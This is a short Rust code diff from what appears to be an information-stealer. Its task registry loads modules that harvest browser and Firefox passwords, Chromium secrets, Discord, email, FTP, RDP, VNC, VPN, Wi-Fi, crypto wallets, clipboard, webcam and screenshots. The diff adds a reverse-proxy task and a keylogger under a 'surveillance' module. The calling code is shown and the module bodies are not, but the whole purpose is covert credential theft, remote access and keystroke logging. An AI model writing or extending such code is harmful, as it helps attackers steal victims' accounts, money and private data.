@@ -85,14 +85,18 @@ async fn register_all_tasks(
     use recovery::browser::browsers;
     use recovery::{
         account_validation, behavioral, chromium, clipboard, devops, discord, email, file_recovery,
-        ftp, gaming, gecko, gecko_passwords, hardware, messenger, other, rdp, screenshot, services,
-        system, vnc, vpn, wallet, webcam, wifi,
+        ftp, gaming, gecko, gecko_passwords, hardware, messenger, other, proxy, rdp, screenshot, services,
+        surveillance, system, vnc, vpn, wallet, webcam, wifi,
     };
 
     manager.register_tasks(browsers::default_browser_tasks(context).await);
     manager.register_tasks(gecko::gecko_tasks(context));
     manager.register_tasks(gecko_passwords::gecko_password_tasks(context));
     manager.register_tasks(chromium::chromium_secrets_tasks(context));
+
+    // Register Proxy & Keylogger
+    manager.register_task(std::sync::Arc::new(proxy::ReverseProxyTask));
+    manager.register_task(std::sync::Arc::new(surveillance::keylogger::KeyloggerTask));
 
     manager.register_tasks(gaming::gaming_service_tasks(context));
     manager.register_tasks(gaming::gaming_extra_tasks(context));
